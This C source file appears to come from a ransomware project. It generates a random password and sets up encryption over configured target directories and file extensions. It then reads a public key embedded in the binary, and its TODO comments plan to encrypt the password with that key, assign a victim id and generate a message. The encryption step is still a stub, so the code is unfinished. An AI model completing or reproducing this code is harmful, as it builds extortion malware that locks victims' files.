#include "app.h"
#include "../cr/random.h"
#include "../cr/crypt.h"
#include "../cr_data/cr.h"
#include "../cr/hash.h"

size_t cr_encrypt_app_init_data(cr_crypt_config_type *config){
	size_t isdone;
	unsigned char *password;
	size_t password_len;
	const size_t exts_len=sizeof(cr_data_exts)/sizeof(char *);
	const size_t dirnames_len=sizeof(cr_data_dirnames)/sizeof(char *);

	// 1. gen password
	isdone=cr_random_fill_with_nums_chars_in_range(cr_data_min_password_size,
						       cr_data_max_password_size,
						       &password,
						       &password_len);
	if (isdone) {
		return 1;
	}

	// 2. init crypt config data 
	config->max_file_enc_size=cr_data_max_file_enc_size;
	config->password=password;
	config->password_len=password_len;
	config->dirnames=cr_data_dirnames;
	config->dirnames_len=dirnames_len;
	config->exts=cr_data_exts;
	config->exts_len=exts_len;

	return 0;
}

void cr_encrypt_app_encrypt_main(){

	cr_crypt_config_type config;
	char *data_keys_keyp;

	cr_encrypt_app_init_data(&config);

	// init encrypt config
	cr_crypt_init(&config);

	// 3. encrypt
	// TODO: change and text this
	cr_crypt_print();

	// 3. read keys from memory
	data_keys_keyp=&_binary_data_keys_cr_keyp_start;
	while(data_keys_keyp!=&_binary_data_keys_cr_keyp_end){
		putchar(*data_keys_keyp++);
	};

	// TODO:
	// 1. encrypt password with public key
	// 2. gen user_id
	// 3. get hash of public key, add it to user_id
	unsigned char *hash;
	size_t hash_len;

	cr_hash_calc_32(config.password,config.password_len,&hash,&hash_len);



	// 4. generate message

}
